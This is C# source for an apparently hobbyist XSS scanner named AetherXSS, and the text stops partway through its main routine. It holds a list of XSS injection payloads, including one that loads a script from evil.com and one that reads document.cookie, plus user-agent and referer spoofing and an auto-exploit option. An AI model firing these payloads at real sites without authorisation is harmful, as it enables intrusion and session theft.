using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text;
using System.Net.Http.Headers;
using System.Web;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Diagnostics;
using Newtonsoft.Json;
using System.Xml;

namespace AetherXSS
{
    public static class AnimatedUI
    {
        private static readonly string[] hackPhrases = new string[]
        {
            "Hack the Planet! 🌍",
            "The Matrix has you... 🕶️",
            "Follow the white rabbit. 🐰",
            "Wake up, Neo... ⏰",
            "May the Force be with you... ⚔️",
            "Do. Or do not. There is no try. 🎯",
            "I find your lack of security disturbing. 😈",
            "The dark side of the Force is a pathway to many abilities some consider to be... unnatural. 🌑",
            "These aren't the vulnerabilities you're looking for... 🤖",
            "ibrahimsql is here, watching always... 👀",
            "0-day hunter in action... 🏹",
            "Scanning the digital realm... 🔍",
            "In a world of 1s and 0s, we are the semicolons... 💻",
            "Exploring the digital wilderness... 🌐",
            "Where there's a shell, there's a way... 🐚",
            "The code is strong with this one... 💪",
            "Resistance is futile, patches are mandatory... 🛡️",
            "I am one with the code, the code is with me... 🧘",
            "Executing Order 66 (security checks)... 🎭",
            "Every system has a weakness. Let's find it. 🎯",
            "In the midst of chaos, there is also opportunity... for XSS. 🎲",
            "The quieter you become, the more you can hear... the bugs. 🐛",
            "Time to pwn this system! 🎮",
            "Scanning ports like a boss! 🚀",
            "Your security needs more cowbell! 🔔",
            "Hack all the things! 🛠️",
            "Bug bounty time! 💰",
            "Loading l33t hacks... 🔄",
            "Security? What security? 🤔",
            "Deploying cyber ninjas... 🥷",
            "Unleashing the kraken! 🐙",
            "Time to break some firewalls! 🧱",
            "Dancing through the packets... 💃",
            "Surfing the cyber waves... 🏄",
            "Hacking at ludicrous speed! ⚡",
            "Vulnerability scanner goes brrr... 🌪️",
            "Cooking up some exploits... 👨‍🍳",
            "Scanning harder than a frustrated printer! 🖨️",
            "This isn't even my final form! 🔥",
            "Hack today, patch tomorrow! 🌅"
        };

        private static readonly string[] loadingChars = new string[] { "⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏" };

        public static void ShowLoadingAnimation(string message, int duration = 2000)
        {
            int i = 0;
            DateTime endTime = DateTime.Now.AddMilliseconds(duration);

            while (DateTime.Now < endTime)
            {
                Console.Write($"\r{loadingChars[i % loadingChars.Length]} {message}");
                Thread.Sleep(100);
                i++;
            }
            Console.WriteLine();
        }

        public static void ShowRandomHackPhrase()
        {
            Random rand = new Random();
            string phrase = hackPhrases[rand.Next(hackPhrases.Length)];
            
            // Random renk seç
            ConsoleColor[] colors = new ConsoleColor[] 
            { 
                ConsoleColor.Green, 
                ConsoleColor.Cyan, 
                ConsoleColor.Yellow, 
                ConsoleColor.Magenta,
                ConsoleColor.Red
            };
            
            Console.ForegroundColor = colors[rand.Next(colors.Length)];
            
            // Matrix tarzı efekt
            string prefix = rand.Next(2) == 0 ? "[*]" : 
                          rand.Next(2) == 0 ? "[+]" : 
                          rand.Next(2) == 0 ? "[>]" : "[$]";
            
            // Yazıyı harf harf yaz
            Console.Write("\n" + prefix + " ");
            foreach (char c in phrase)
            {
                Console.Write(c);
                Thread.Sleep(10); // Her harf için küçük bir gecikme
            }
            Console.WriteLine();
            
            Console.ResetColor();
            Thread.Sleep(50);
        }

        public static void ShowProgressBar(int progress, int total)
        {
            int barSize = 40;
            int filledSize = (int)((double)progress / total * barSize);
            
            Console.Write("\r[");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write(new string('█', filledSize));
            Console.Write(new string('░', barSize - filledSize));
            Console.ResetColor();
            Console.Write($"] {progress}/{total} ({(int)((double)progress / total * 100)}%)");
        }

        public static void PrintBanner()
        {
            string banner = @"
    ▄▄▄     ▄▄▄█████▓ ██░ ██ ▓█████  ██▀███  ▒██   ██▒  ██████   ██████ 
   ▒████▄   ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒▒▒ █ █ ▒░▒██    ▒ ▒██    ▒ 
   ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░▒███   ▓██ ░▄█ ▒░░  █   ░░ ▓██▄   ░ ▓██▄   
   ░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄   ░ █ █ ▒   ▒   ██▒  ▒   ██▒
    ▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓░▒████▒░██▓ ▒██▒▒██▒ ▒██▒▒██████▒▒▒██████▒▒
    ▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░";

            
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(banner);
            
            Console.WriteLine("\n🔥 AetherXSS - Advanced Cross-Site Scripting Scanner 🔥\n");
            
            Console.ResetColor();
        }

        public static void ShowScanningAnimation(string target)
        {
            string[] scanFrames = new string[]
            {
                $"[↑] Scanning {target}",
                $"[→] Scanning {target}",
                $"[↓] Scanning {target}",
                $"[←] Scanning {target}"
            };

            for (int i = 0; i < 8; i++)
            {
                Console.Write($"\r{scanFrames[i % scanFrames.Length]}");
                Thread.Sleep(100);
            }
            Console.WriteLine();
        }

        public static void ShowVulnerabilityFound(string url, string type)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("╔════════════════════════════════════════════");
            Console.WriteLine("║ VULNERABILITY DETECTED!");
            Console.WriteLine("╠════════════════════════════════════════════");
            Console.WriteLine($"║ Type: {type}");
            Console.WriteLine($"║ URL: {url}");
            Console.WriteLine("╚════════════════════════════════════════════");
            Console.ResetColor();
            
            // Play alert sound only on Windows
            if (OperatingSystem.IsWindows())
            {
                try
                {
                    Console.Beep(800, 200);
                }
                catch
                {
                    // Ignore any errors if beep fails
                }
            }
        }
    }

    class AdvancedXSSScanner
    {
        private static readonly HttpClient client = new HttpClient();
        private static bool useColor = true;
        private static bool verbose = false;
        private static bool autoExploit = false;
        private static int delayBetweenRequests = 0;
        private static int maxThreads = 5;
        private static readonly List<string> customPayloads = new List<string>();
        private static readonly List<string> discoveredVulnerabilities = new List<string>();
        private static string reportPath = "xss_report.html";
        private static HashSet<string> testedUrls = new HashSet<string>();
        private static Dictionary<string, int> statistics = new Dictionary<string, int>
        {
            { "testedUrls", 0 },
            { "vulnerableUrls", 0 },
            { "failedRequests", 0 },
            { "parametersFound", 0 }
        };

        // Expanded list of XSS payloads
        private static readonly List<string> xssPayloads = new List<string>
        {
            // Basic XSS vectors
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<select autofocus onfocus=alert('XSS')>",
            "<textarea autofocus onfocus=alert('XSS')>",
            "<keygen autofocus onfocus=alert('XSS')>",
            "<video><source onerror=\"javascript:alert('XSS')\">",
            
            // HTML5 vectors
            "<audio src=x onerror=alert('XSS')>",
            "<video src=x onerror=alert('XSS')>",
            "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert('XSS')\">CLICKME</maction>",
            "<form><button formaction=\"javascript:alert('XSS')\">CLICKME</button>",
            "<isindex type=image src=1 onerror=alert('XSS')>",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">",
            
            // Event handlers
            "<div onmouseover=\"alert('XSS')\">hover me</div>",
            "<div onclick=\"alert('XSS')\">click me</div>",
            "<body onscroll=alert('XSS')><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>",
            
            // Obfuscated payloads
            "<img src=\"javascript:alert('XSS');\">",
            "<img src=javascript:alert('XSS')>",
            "<img src=JaVaScRiPt:alert('XSS')>",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
            "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
            
            // Data URI schemes
            "<img src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
            "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
            
            // Filter evasion
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<<script>alert('XSS');//<</script>",
            "<script src=//evil.com/xss.js></script>",
            "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')</script>",
            "<img src=x:alert(alt) onerror=eval(src) alt='XSS'>",
            
            // AngularJS specific
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
            "<x ng-app>{{constructor.constructor('alert(1)')()}}</x>",
            
            // DOM-based XSS
            "<script>document.write('<img src=x onerror=alert(1)>')</script>",
            "<script>document.write('<iframe src=\"javascript:alert(1)\">')</script>",
            
            // Advanced payloads
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            "<svg><animate attributeName=x dur=1s onbegin=alert('XSS')>",
            "<svg><animate attributeName=x dur=1s onend=alert('XSS')>",
            "<svg><set attributeName=x dur=1s onbegin=alert('XSS')>",
            "<svg><set attributeName=x dur=1s onend=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><style>{font-family:'<iframe/onload=alert(\"XSS\")'}</style>",
            
            // Exotic payloads
            "<marquee onstart=alert('XSS')>",
            "<div/onmouseover='alert(\"XSS\")'>X</div>",
            "<details open ontoggle=alert('XSS')>",
            "<iframe src=\"javascript:alert(`XSS`)\">"
        };

        // Expanded list of User-Agents
        private static readonly List<string> userAgents = new List<string>
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36"
        };

        // Expanded list of common HTTP headers
        private static readonly Dictionary<string, string> commonHeaders = new Dictionary<string, string>
        {
            { "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" },
            { "Accept-Language", "en-US,en;q=0.5" },
            { "Accept-Encoding", "gzip, deflate, br" },
            { "DNT", "1" },
            { "Connection", "keep-alive" },
            { "Upgrade-Insecure-Requests", "1" },
            { "Cache-Control", "max-age=0" },
            { "TE", "Trailers" }
        };

        // Expanded list of common HTTP referers
        private static readonly List<string> commonReferers = new List<string>
        {
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.yahoo.com/",
            "https://www.facebook.com/",
            "https://www.twitter.com/",
            "https://www.linkedin.com/",
            "https://www.github.com/",
            "https://www.youtube.com/",
            "https://www.instagram.com/",
            "https://www.reddit.com/"
        };

        // Common parameters to check for XSS
        private static readonly List<string> commonParameters = new List<string>
        {
            "q", "s", "search", "id", "action", "page", "keywords", "query", "name", "key", 
            "p", "month", "year", "category", "type", "file", "sort", "lang", "term", "debug",
            "from", "to", "subject", "message", "content", "body", "title", "url", "view", "mode",
            "text", "data", "redirect", "redirect_uri", "return", "return_url", "next", "redir",
            "callback", "jsonp", "api_key", "token", "user", "username", "password", "pass", "login",
            "email", "account", "item", "keyword", "tag", "ref", "show", "source", "destination",
            "path", "dir", "date", "time", "timestamp", "start", "end", "width", "height", "size",
            "first", "last", "format", "template", "session", "version", "code", "error", "msg",
            "return_to", "target", "theme", "ui", "style", "language", "offset", "limit", "count",
            "page_id", "post_id", "comment_id", "user_id", "group_id", "topic_id", "thread_id",
            "preview", "comment", "description", "note", "order", "sort_by", "filter", "search"
        };

        // Content type wordlist
        private static readonly List<string> contentTypes = new List<string>
        {
            "application/x-www-form-urlencoded",
            "application/json",
            "multipart/form-data",
            "text/plain",
            "application/xml"
        };

        // HTTP methods to test
        private static readonly List<string> httpMethods = new List<string>
        {
            "GET",
            "POST",
            "PUT",
            "DELETE",
            "OPTIONS",
            "HEAD",
            "PATCH"
        };

        // DOM XSS sinks to search for in responses
        private static readonly List<string> domXssSinks = new List<string>
        {
            "document.write(",
            "document.writeln(",
            "document.domain",
            "element.innerHTML",
            "element.outerHTML",
            "element.insertAdjacentHTML",
            "element.onevent",
            "eval(",
            "setTimeout(",
            "setInterval(",
            "location",
            "location.href",
            "location.search",
            "location.hash",
            "location.pathname",
            "document.URL",
            "document.documentURI",
            "document.URLUnencoded",
            "document.baseURI",
            "document.referrer",
            "window.name",
            "history.pushState(",
            "history.replaceState(",
            "localStorage",
            "sessionStorage",
            "$().html(",
            "$().html(",
            "angular.callbacks",
            "execScript(",
            "crypto.generateCRMFRequest(",
            "ScriptElement.src",
            "Function(",
            "setImmediate(",
            "range.createContextualFragment("
        };

        private static void PrintColored(string message, ConsoleColor color)
        {
            if (useColor)
            {
                Console.ForegroundColor = color;
                Console.WriteLine(message);
                Console.ResetColor();
            }
            else
            {
                Console.WriteLine(message);
            }
        }

        private static void AddHeaders(HttpRequestMessage request, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
        {
            // Add common headers
            foreach (var header in commonHeaders)
            {
                request.Headers.Add(header.Key, header.Value);
            }

            // Add custom user agent if provided, otherwise use a random one
            if (!string.IsNullOrEmpty(customUserAgent))
            {
                request.Headers.Add("User-Agent", customUserAgent);
            }
            else
            {
                Random rand = new Random();
                request.Headers.Add("User-Agent", userAgents[rand.Next(userAgents.Count)]);
            }

            // Add cookie if provided
            if (!string.IsNullOrEmpty(cookie))
            {
                request.Headers.Add("Cookie", cookie);
            }

            // Add random referer
            Random refRand = new Random();
            request.Headers.Add("Referer", commonReferers[refRand.Next(commonReferers.Count)]);

            // Add extra headers if provided
            if (extraHeaders != null)
            {
                foreach (var header in extraHeaders)
                {
                    request.Headers.Add(header.Key, header.Value);
                }
            }
        }

        private static void PrintBanner()
        {
            AnimatedUI.PrintBanner();
        }

        private static void ShowSystemInfo()
        {
            string[] scanMessages = new string[]
            {
                "🚀 AetherXSS goes brrrr...",
                "💉 Time to inject some chaos...",
                "🎯 Ready to pwn some XSS...",
                "🔥 Fire up the XSS cannon!",
                "🕷️ Spider-sense tingling... XSS nearby!",
                "🎮 Game time! Let's play find the vulnerability",
                "🧪 Mad scientist mode: ACTIVATED",
                "🎭 Stealth mode engaged... they won't see us coming",
                "⚡ Charging up the payload launcher...",
                "🎪 Welcome to the XSS circus!",
                "🎲 Rolling the dice for vulnerabilities...",
                "🎯 Target acquired, commencing scan...",
                "🔮 Crystal ball says: XSS vulnerabilities ahead!",
                "🎨 Painting the target with payloads...",
                "🎭 Time to test if this website trusts everyone..."
            };

            Random rand = new Random();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"\n[~] {scanMessages[rand.Next(scanMessages.Length)]}");
            
            // Config file check with RustScan style
            string configPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".aetherxss.config");
            Console.WriteLine($"[~] Looking for config file at \"{configPath}\" (like finding a needle in a haystack)");
            
            // System checks with humor
            int currentThreads = Environment.ProcessorCount;
            if (currentThreads < 4)
            {
                string[] threadMessages = {
                    "🐌 Your CPU is moving slower than my grandma! More threads needed",
                    "🐢 CPU running on Internet Explorer speed. Need more power!",
                    "⚡ Your thread count is lower than my coffee intake... MOAR THREADS!"
                };
                Console.WriteLine($"[!] {threadMessages[rand.Next(threadMessages.Length)]}");
            }

            // Memory check with RustScan style
            try
            {
                var process = Process.GetCurrentProcess();
                long memoryMB = process.WorkingSet64 / 1024 / 1024;
                if (memoryMB < 512)
                {
                    string[] memoryMessages = {
                        "🐹 Your RAM is running on hamster power",
                        "📉 Memory looking thinner than a pizza crust",
                        "💾 Memory situation: It's not you, it's me... but actually it's you"
                    };
                    Console.WriteLine($"[!] {memoryMessages[rand.Next(memoryMessages.Length)]}");
                }
            }
            catch { }

            // Network warning with RustScan style
            string[] networkMessages = {
                "🏎️ SPEED LIMIT? Never heard of it!",
                "⚡ Going faster than my mom's spaghetti",
                "🚄 Scanning faster than light (almost)!",
                "🌪️ Tornado mode activated: No rate limiting!"
            };
            Console.WriteLine($"[!] {networkMessages[rand.Next(networkMessages.Length)]} Use --delay if you're scared");

            // Show current target status with animations
            Console.ForegroundColor = ConsoleColor.Cyan;
            string[] loadingMessages = {
                "🎯 Targeting systems engaged...",
                "🔍 Scanning perimeter...",
                "🕷️ Deploying scanner spiders...",
                "🚀 Launching payload matrix...",
                "⚡ Charging the XSS cannon...",
                "🎮 Loading game: 'Hack The Planet'...",
                "🔮 Consulting the cyber oracle...",
                "🎪 Setting up the hacking circus..."
            };

            for (int i = 0; i < 3; i++)
            {
                Console.Write($"\r[*] {loadingMessages[rand.Next(loadingMessages.Length)]}");
                Thread.Sleep(300);
            }
            Console.WriteLine();
            
            // Pro tips with RustScan style
            string[] tips = {
                "🎓 Pro tip: Use --auto-exploit to unleash MAXIMUM CHAOS",
                "🎯 Pro tip: Custom payloads = More fun (--wordlist)",
                "🔍 Pro tip: --verbose mode for when you're feeling nosey",
                "🕸️ Pro tip: --crawl to find ALL the things!",
                "⚡ Pro tip: More threads = More speed = More fun!"
            };
            
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine($"\n[i] {tips[rand.Next(tips.Length)]}");
            
            Console.ResetColor();
            Console.WriteLine();

            // Final loading animation
            AnimatedUI.ShowLoadingAnimation("🚀 Powering up the AetherXSS engines...");
        }

        static async Task Main(string[] args)
        {
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();

            try
            {
                if (args.Length < 2 || args[0] != "--url")
                {
                    PrintBanner();
                    ShowSystemInfo();  // Add system info display
                    Console.WriteLine("Usage: AetherXSS --url <target_site> [options]");
                    Console.WriteLine("\nOptions:");
                    Console.WriteLine("  --url <url>              Target URL to scan (required)");
                    Console.WriteLine("  --no-color               Disable colored output");
                    Console.WriteLine("  --proxy <proxy_url>      Use proxy for requests");
                    Console.WriteLine("  --cookie <cookie_data>   Use custom cookies");
                    Console.WriteLine("  --headers <h1:v1,...>    Use custom HTTP headers");
                    Console.WriteLine("  --user-agent <ua>        Use specific User-Agent");
                    Console.WriteLine("  --wordlist <file>        Load custom payload list");
                    Console.WriteLine("  --threads <num>          Number of concurrent threads (default: 5)");
                    Console.WriteLine("  --delay <ms>             Delay between requests (milliseconds)");
                    Console.WriteLine("  --timeout <sec>          Request timeout (seconds) (default: 30)");
                    Console.WriteLine("  --output <file>          Save results to file");
                    Console.WriteLine("  --verbose                Show detailed output");
                    Console.WriteLine("  --dom-scan               Enable DOM-based XSS scanning");
                    Console.WriteLine("  --crawl                  Crawl website for additional URLs");
                    Console.WriteLine("  --depth <num>            Crawl depth (default: 2)");
                    Console.WriteLine("  --params                 Test common parameter names");
                    Console.WriteLine("  --methods                Test different HTTP methods");
                    Console.WriteLine("  --fuzz-headers           Fuzz HTTP headers for XSS");
                    Console.WriteLine("  --auto-exploit           Attempt to automatically exploit found vulnerabilities");
                    Console.WriteLine("  --help                   Show this help message");
                    return;
                }

                PrintBanner();

                string targetUrl = args[1];
                string proxy = null;
                string cookie = null;
                string userAgent = null;
                string wordlistPath = null;
                bool domScanEnabled = false;
                bool crawlEnabled = false;
                int crawlDepth = 2;
                bool testParamsEnabled = false;
                bool testMethods = false;
                bool fuzzHeaders = false;
                int timeout = 30;
                string outputFile = null;
                Dictionary<string, string> extraHeaders = new Dictionary<string, string>();

                for (int i = 2; i < args.Length; i++)
                {
                    switch (args[i])
                    {
                        case "--no-color":
                            useColor = false;
                            break;
                        case "--proxy" when i + 1 < args.Length:
                            proxy = args[++i];
                            break;
                        case "--cookie" when i + 1 < args.Length:
                            cookie = args[++i];
                            break;
                        case "--headers" when i + 1 < args.Length:
                            string[] headers = args[++i].Split(',');
                            foreach (var header in headers)
                            {
                                string[] keyValue = header.Split(':');
                                if (keyValue.Length == 2) extraHeaders[keyValue[0].Trim()] = keyValue[1].Trim();
                            }
                            break;
                        case "--user-agent" when i + 1 < args.Length:
                            userAgent = args[++i];
                            break;
                        case "--wordlist" when i + 1 < args.Length:
                            wordlistPath = args[++i];
                            break;
                        case "--threads" when i + 1 < args.Length:
                            if (int.TryParse(args[++i], out int threads) && threads > 0)
                                maxThreads = threads;
                            break;
                        case "--delay" when i + 1 < args.Length:
                            if (int.TryParse(args[++i], out int delay) && delay >= 0)
                                delayBetweenRequests = delay;
                            break;
                        case "--timeout" when i + 1 < args.Length:
                            if (int.TryParse(args[++i], out int timeoutSec) && timeoutSec > 0)
                                timeout = timeoutSec;
                            break;
                        case "--output" when i + 1 < args.Length:
                            outputFile = args[++i];
                            break;
                        case "--verbose":
                            verbose = true;
                            break;
                        case "--dom-scan":
                            domScanEnabled = true;
                            break;
                        case "--crawl":
                            crawlEnabled = true;
                            break;
                        case "--depth" when i + 1 < args.Length:
                            if (int.TryParse(args[++i], out int depth) && depth > 0)
                                crawlDepth = depth;
                            break;
                        case "--params":
                            testParamsEnabled = true;
                            break;
                        case "--methods":
                            testMethods = true;
                            break;
                        case "--fuzz-headers":
                            fuzzHeaders = true;
                            break;
                        case "--auto-exploit":
                            autoExploit = true;
                            break;
                        case "--help":
                            PrintBanner();
                            Console.WriteLine("Usage: AetherXSS --url <target_site> [options]");
                            return;
                    }
                }

                // Set HTTP client timeout
                client.Timeout = TimeSpan.FromSeconds(timeout);

                // Set proxy if specified
                if (!string.IsNullOrEmpty(proxy))
                {
                    WebProxy webProxy = new WebProxy(proxy);
                    HttpClientHandler handler = new HttpClientHandler
                    {
                        Proxy = webProxy,
                        UseProxy = true
                    };
                    client.DefaultRequestHeaders.Add("Via", "1.1 AetherXSS");
                }

                // Load custom payloads if wordlist is provided
                if (!string.IsNullOrEmpty(wordlistPath) && File.Exists(wordlistPath))
                {
                    try
                    {
                        string[] payloads = File.ReadAllLines(wordlistPath);
                        customPayloads.AddRange(payloads);
                        PrintColored($"🔹 Loaded {payloads.Length} custom payloads from {wordlistPath}", ConsoleColor.Cyan);
                    }
                    catch (Exception ex)
                    {
                        PrintColored($"⚠️ Error loading wordlist: {ex.Message}", ConsoleColor.Yellow);
                    }
                }

                // Set output file if specified
                if (!string.IsNullOrEmpty(outputFile))
                {
                    reportPath = outputFile;
                }

                PrintColored($"🔍 Starting XSS scan on {targetUrl}...\n", ConsoleColor.Cyan);
                Console.WriteLine($"📌 Date/Time: {DateTime.Now}");
                
                if (!string.IsNullOrEmpty(proxy))
                {
                    Console.WriteLine($"🔹 Using Proxy: {proxy}");
                }
                
                if (delayBetweenRequests > 0)
                {
                    Console.WriteLine($"🔹 Delay between requests: {delayBetweenRequests}ms");
                }
                
                if (maxThreads > 0)
                {
                    Console.WriteLine($"🔹 Number of parallel threads: {maxThreads}");
                }

                Console.WriteLine($"🔹 XSS payload count: {xssPayloads.Count + customPayloads.Count}");
                Console.WriteLine();

                List<string> urlsToTest = new List<string> { targetUrl };

                // Crawl for additional URLs if enabled
                if (crawlEnabled)
                {
                    PrintColored("🕸️ Crawling website, please wait...", ConsoleColor.Cyan);
                    var crawledUrls = await CrawlWebsite(targetUrl, crawlDepth);
                    urlsToTest.AddRange(crawledUrls);
                    PrintColored($"🕸️ Found a total of {crawledUrls.Count} URLs.", ConsoleColor.Cyan);
                }

                // Create a semaphore to limit concurrent tasks
                SemaphoreSlim semaphore = new SemaphoreSlim(maxThreads);
                List<Task> tasks = new List<Task>();

                // Test each URL
                foreach (var url in urlsToTest)
                {
                    await semaphore.WaitAsync();
                    
                    tasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            // Show a random hack message before each test
                            AnimatedUI.ShowRandomHackPhrase();
                            
                            // Test regular payloads
                            foreach (var payload in xssPayloads.Concat(customPayloads))
                            {
                                try
                                {
                                    await TestGetRequest(url, payload, cookie, extraHeaders, userAgent);
                                    
                                    // Apply delay if specified
                                    if (delayBetweenRequests > 0)
                                    {
                                        await Task.Delay(delayBetweenRequests);
                                    }
                                    
                                    await TestPostRequest(url, payload, cookie, extraHeaders, userAgent);
                                    
                                    // Apply delay if specified
                                    if (delayBetweenRequests > 0)
                                    {
                                        await Task.Delay(delayBetweenRequests);
                                    }

                                    // Test different HTTP methods if enabled
                                    if (testMethods)
                                    {
                                        foreach (var method in httpMethods.Where(m => m != "GET" && m != "POST"))
                                        {
                                            await TestCustomMethodRequest(url, method, payload, cookie, extraHeaders, userAgent);
                                            
                                            if (delayBetweenRequests > 0)
                                            {
                                                await Task.Delay(delayBetweenRequests);
                                            }
                                        }
                                    }

                                    // Fuzz headers if enabled
                                    if (fuzzHeaders)
                                    {
                                        await TestHeaderInjection(url, payload, cookie, extraHeaders, userAgent);
                                        
                                        if (delayBetweenRequests > 0)
                                        {
                                            await Task.Delay(delayBetweenRequests);
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                    if (verbose)
                                    {
                                        PrintColored($"⚠️ Error testing payload {payload}: {ex.Message}", ConsoleColor.Yellow);
                                    }
                                    
                                    lock (statistics)
                                    {
                                        statistics["failedRequests"]++;
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            if (verbose)
                            {
                                PrintColored($"⚠️ Error testing URL {url}: {ex.Message}", ConsoleColor.Yellow);
                            }
                        }
                    }));
                }

                // Wait for all tasks to complete
                await Task.WhenAll(tasks);

                // Generate report
                GenerateReport(reportPath);

                stopwatch.Stop();
                PrintColored($"\n✅ Scan completed. Duration: {stopwatch.Elapsed.TotalSeconds:F2} seconds", ConsoleColor.Green);
                PrintColored($"🔍 {statistics["testedUrls"]} URLs tested", ConsoleColor.Cyan);
